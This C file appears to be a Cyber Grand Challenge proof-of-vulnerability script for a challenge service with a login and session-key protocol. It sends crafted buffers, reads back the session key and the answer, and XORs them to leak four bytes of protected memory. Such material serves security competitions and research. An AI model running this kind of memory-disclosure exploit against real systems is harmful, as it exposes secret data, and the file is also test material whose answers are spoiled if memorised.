/*
 * Copyright (C) Narf Industries <info@narfindustries.com>
 *
 * Permission is hereby granted, free of charge, to any person obtaining a
 * copy of this software and associated documentation files (the "Software"),
 * to deal in the Software without restriction, including without limitation
 * the rights to use, copy, modify, merge, publish, distribute, sublicense,
 * and/or sell copies of the Software, and to permit persons to whom the
 * Software is furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included
 * in all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS
 * OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
 * MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.
 * IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY
 * CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT,
 * TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE
 * SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
*/
#include <libpov.h>
int main(void) {
   // set last 4 bytes of session.key in initial send to be consecutive
   // read respones packet to failed login, read the session key and the
   // session answer. use the first 4 unused bytes in the session answer 
   // and xor them with the last 4 bytes of the session key to get 4 fp bytes.
   negotiate_type2();
   unsigned char flag[4] = {0,0,0,0};
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\x52\x55\x43\x6d\x49\x4f\x58\x62\x52\x71\x70\x79\x56\x5a\x61\x52"
         "\x48\x50\x69\x78\x42\x72\x66\x4e\x00\x00\x00\x00\x00\x00\x00\x00"
         "\x00\x00\x00\x00\xa0\xa1\xa2\xa3\xa0\xa1\xa2\xa3\x88\x02\x45\x58"
         "\x51\x56\x65\x6e\x44\x54\x47\x48\x49\x51\x53\x44\x76\x6e\x70\x64"
         "\x4e\x47\x71\x78\x4e\x77\x79\x75\x50\x78\x47\x79\x58\x65\x74\x53"
         "\x43\x43\x76\x46\x48\x6c\x67\x51\x65\x42\x71\x6b\x69\x79\x56\x75"
         "\x4f\x41\x49\x78\x44\x50\x5a\x66\x4f\x52\x57\x51\x6d\x56\x62\x79"
         "\x42\x6b\x4c\x6d\x75\x6a\x4f\x4e\x74\x47\x67\x70\x6f\x76\x6e\x78"
         "\x76\x66\x6c\x68\x4b\x64\x4e\x4e\x57\x56\x52\x72\x6d\x6a\x43\x68"
         "\x79\x46\x4f\x48\x54\x4a\x57\x43\x66\x75\x6e\x43\x63\x49\x59\x6b"
         "\x43\x75\x71\x66\x61\x70\x78\x44\x72\x72\x48\x6b\x6d\x7a\x4b\x4a"
         "\x75\x4f\x65\x46\x72\x77\x4c\x62\x5a\x4d\x6a\x4a\x70\x4c\x4d\x51"
         "\x4f\x62\x47\x43\x6a\x6b\x44\x74\x75\x52\x63\x50\x68\x42\x55\x62"
         "\x74\x56\x79\x50\x45\x5a\x56\x45\x76\x6c\x6b\x6f\x6c\x63\x6e\x72"
         "\x4c\x58\x43\x51\x61\x52\x4e\x62\x7a\x63\x79\x65\x53\x48\x59\x48"
         "\x41\x73\x45\x42\x51\x58\x4b\x64\x43\x68\x4b\x4d\x61\x6c\x66\x65"
         "\x70\x69\x75\x65\x63\x47\x61\x66\x65\x45\x79\x6a\x46\x67\x5a\x76"
         "\x41\x46\x57\x69\x78\x70\x53\x52\x58\x74\x64\x4c\x51\x4a\x7a\x68"
         "\x77\x48\x53\x67\x76\x64\x4a\x55\x4d\x4e\x52\x77\x72\x67\x45\x6f"
         "\x46\x4d\x5a\x79\x63\x6c\x44\x41\x74\x79\x48\x65\x42\x6c\x44\x77"
         "\x57\x78\x47\x47\x47\x51\x63\x64\x58\x50\x4c\x4c\x7a\x74\x6c\x64"
         "\x6f\x41\x6a\x57\x78\x57\x4f\x4f\x43\x68\x73\x75\x76\x71\x58\x4b"
         "\x56\x51\x73\x78\x4b\x74\x55\x63\x4e\x6e\x56\x49\x42\x53\x46\x49"
         "\x57\x69\x4e\x4d\x64\x64\x78\x4a\x49\x47\x4e\x6c\x70\x70\x6d\x46"
         "\x4f\x68\x63\x41\x50\x72\x73\x66\x5a\x52\x70\x76\x59\x47\x43\x6b"
         "\x52\x66\x42\x64\x6c\x45\x41\x76\x75\x62\x4e\x4c\x6f\x72\x63\x5a"
         "\x47\x6f\x5a\x62\x4a\x54\x4b\x6f\x54\x76\x45\x77\x74\x66\x45\x6b"
         "\x6b\x55\x58\x4a\x53\x58\x74\x42\x49\x6c\x6d\x47\x59\x76\x4d\x74"
         "\x78\x52\x71\x70\x54\x4f\x57\x6d\x64\x68\x62\x57\x52\x55\x5a\x48"
         "\x49\x74\x65\x41\x43\x71\x79\x53\x76\x79\x66\x42\x67\x53\x52\x6e"
         "\x66\x66\x69\x63\x57\x48\x70\x62\x75\x64\x4f\x55\x6a\x69\x44\x51"
         "\x74\x61\x75\x66\x51\x6b\x55\x41\x70\x7a\x76\x49\x57\x71\x50\x76"
         "\x65\x76\x59\x77\x67\x56\x74\x53\x75\x75\x62\x6f\x75\x76\x70\x65"
         "\x4e\x52\x4d\x54\x55\x4f\x41\x50\x76\x75\x6f\x4a\x5a\x4a\x42\x44"
         "\x75\x71\x51\x57\x64\x69\x79\x4e\x74\x76\x6d\x51\x65\x67\x48\x4e"
         "\x4a\x41\x46\x55\x5a\x55\x6e\x63\x57\x46\x63\x66\x49\x78\x75\x61"
         "\x64\x46\x78\x75\x6a\x75\x5a\x58\x6f\x4a\x53\x69\x4d\x56\x49\x47"
         "\x77\x51\x54\x4d\x52\x48\x51\x77\x45\x41\x53\x64\x61\x54\x5a\x4d"
         "\x76\x48\x6f\x55\x75\x65\x6f\x58\x48\x65\x4b\x55\x44\x6a\x45\x52"
         "\x7a\x63\x51\x75\x56\x73\x59\x49\x45\x59\x52\x69\x41\x6f\x46\x69"
         "\x51\x6d\x48\x4a\x72\x4b\x67\x5a\x66\x71\x49\x6d\x73\x77\x79\x51"
         "\x78\x6a\x52\x5a\x59\x65\x4b\x44\x68\x75\x59\x78\x73\x70\x48\x67"
         "\x49\x47\x64\x51\x42\x4e\x61\x47\x74\x68\x6b\x58\x70\x63\xb5\xd5"
         "\x28\x00\x03\xaf\x35\x00";
      static unsigned int write_00000_00000_len = 694;
      // make last 4 bytes of session.key consecutive
      unsigned char first = write_00000_00000[8];
      write_00000_00000[9] = first + 1;
      write_00000_00000[10] = first + 2;
      write_00000_00000[11] = first + 3;

      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         transmit_all(1, write_00000, write_00000_len);
      }
      free(write_00000);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** length read
      read_00000_len = 148;
      read_00000 = (unsigned char*)malloc(read_00000_len);
      int read_00000_res = length_read(0, read_00000, read_00000_len);
      if (read_00000_res) {} //silence unused variable warning
      free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x65\x43\x70\x49\x71\x6e\x4b\x62\x5a\x47\x68\x54\x66\x54\x4c\x51"
         "\x57\x47\x4b\x73\x52\x46\x64\x53\x00\x00\x00\x00\x00\x00\x00\x00"
         "\x00\x00\x00\x00\xac\xac\xac\xac\xac\xac\xac\xac\x00\x00";
      static unsigned int write_00001_00000_len = 46;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         transmit_all(1, write_00001, write_00001_len);
      }
      free(write_00001);
   } while (0);

   // read key
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** length read
      read_00001_len = 12;
      read_00001 = (unsigned char*)malloc(read_00001_len);
      int read_00001_res = length_read(0, read_00001, read_00001_len);
      if (read_00001_res) {} //silence unused variable warning

   do { // read answer
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** length read
      read_00002_len = 8;
      read_00002 = (unsigned char*)malloc(read_00002_len);
      int read_00002_res = length_read(0, read_00002, read_00002_len);
      if (read_00002_res) {} //silence unused variable warning
      free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);

   // read answer bytes after answer
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** length read
      read_00003_len = 120;
      read_00003 = (unsigned char*)malloc(read_00003_len);
      int read_00003_res = length_read(0, read_00003, read_00003_len);
      if (read_00003_res) {} //silence unused variable warning

   do { // read result
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** length read
      read_00004_len = 8;
      read_00004 = (unsigned char*)malloc(read_00004_len);
      int read_00004_res = length_read(0, read_00004, read_00004_len);
      if (read_00004_res) {} //silence unused variable warning
      free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
   //*** submitting type 2 POV results
   flag[0] = read_00001[8]  ^ read_00003[0];
   flag[1] = read_00001[9]  ^ read_00003[1];
   flag[2] = read_00001[10] ^ read_00003[2];
   flag[3] = read_00001[11] ^ read_00003[3];

   type2_submit(flag, sizeof(flag));
}
